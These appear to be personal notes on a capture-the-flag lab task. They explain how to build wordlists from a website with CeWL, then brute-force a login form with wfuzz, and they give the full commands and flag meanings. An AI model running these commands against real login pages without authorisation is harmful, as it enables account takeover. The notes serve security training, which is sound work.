## Task 10, Day 04, <code>Brute-forcing</code> Baby, it's CeWLd outside

CeWL is a custom wordlist generator that spiders websites to create word lists based on the site's content. Capability helps in brute-forcing and uncovering hidden directories using organization-specific terminology. Can also compile lists of email addresses or usernames from team member pages. 

Create basic list:<br>
<code>cewl http://ADDRESS</code>

Create and save list to file:<br>
<code>cewl http://ADDRESS -w FILENAME.txt</code>

Since it's CLI, it can be easily integrated into automated workflows and outputs can be directly inserted into other tools.

In this case, use wfuzz to make use of outputs.<br>
```
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://ADDRESS/login.php -d "username=FUZZ&password=FUZ2Z"
```

- <code>-c</code> output with colors
- <code>-z file,usernames.txt</code> loads the usernames list
- <code>-z file,passwords.txt</code> uses the password list generated by CeWL
- <code>--hs "Please enter the correct credentials"</code> hides responses containing the defined string
- <code>-u</code> target URL
- <code>-d "username=FUZZ&password=FUZ2Z"</code> provides POST data format to use and variables to replace

### The Task
Generate username and password word lists from the website, then use wfuzz to find the credentials that work and grab the flag from the email. 

Flag gotten.
